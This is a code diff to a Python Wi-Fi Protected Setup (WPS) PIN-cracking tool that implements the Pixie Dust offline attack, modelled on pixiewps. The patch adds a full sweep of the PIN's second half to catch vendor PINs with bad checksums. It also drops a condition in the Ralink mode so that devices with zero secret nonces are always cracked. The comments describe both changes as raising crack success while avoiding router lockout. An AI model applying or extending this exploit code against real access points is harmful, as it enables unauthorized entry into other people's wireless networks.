@@ -187,6 +187,17 @@ def _crack_second_half(auth_key: bytes, es2: bytes, pke: bytes, pkr: bytes,
         psk = _psk_half(auth_key, second.encode())
         if _check_hash(auth_key, es2, psk, pke, pkr, e_hash2):
             return second
+    # pixiewps's fallback sweep: some vendors ship PINs whose 8th digit
+    # fails the WPS checksum. crack_pin_from_secrets is the ONLY offline
+    # gate for every mode (RT/ECOS/RTL), so without this a bad-checksum
+    # PIN on a zero-ES/PRNG-vulnerable AP returned None for the whole
+    # run -- a silent missed crack that then costs online lockout budget.
+    # Checksum-valid halves above are a strict subset of this sweep.
+    for n in range(10000):
+        second = f"{n:04d}"
+        psk = _psk_half(auth_key, second.encode())
+        if _check_hash(auth_key, es2, psk, pke, pkr, e_hash2):
+            return second
     return None
 
 
@@ -208,12 +219,17 @@ def crack_pin_from_secrets(auth_key: bytes, es1: bytes, es2: bytes,
 def _try_rt(e_nonce: bytes, auth_key: bytes, pke: bytes, pkr: bytes,
             e_hash1: bytes, e_hash2: bytes) -> str | None:
     """Ralink LFSR: reverse from E-Nonce to find E-S1/E-S2 preceding it."""
-    # Special case: E-S1 = E-S2 = 0x00 * 16
+    # E-S1 = E-S2 = 0x00 * 16 (pixiewps's mode-1 special case): try it
+    # UNCONDITIONALLY. The old gate here also required PSK1 == HMAC(AuthKey,
+    # "") -- only entering when the PIN's first half was EMPTY -- but a
+    # zero-ES device has a perfectly ordinary PIN; crack_pin_from_secrets
+    # brute-forces 0000-9999 against e_hash1 anyway, so the gate just kept
+    # normal-PIN zero-ES devices from ever being cracked offline (pixiewps
+    # finds them). ~11k HMACs, negligible next to the modes below.
     zero = bytes(16)
-    if _check_hash(auth_key, zero, _psk_half(auth_key, b""), pke, pkr, e_hash1):
-        pin = crack_pin_from_secrets(auth_key, zero, zero, pke, pkr, e_hash1, e_hash2)
-        if pin is not None:
-            return pin
+    pin = crack_pin_from_secrets(auth_key, zero, zero, pke, pkr, e_hash1, e_hash2)
+    if pin is not None:
+        return pin
 
     # Reverse the LFSR through E-Nonce bytes to find the pre-nonce state
     sreg = 0
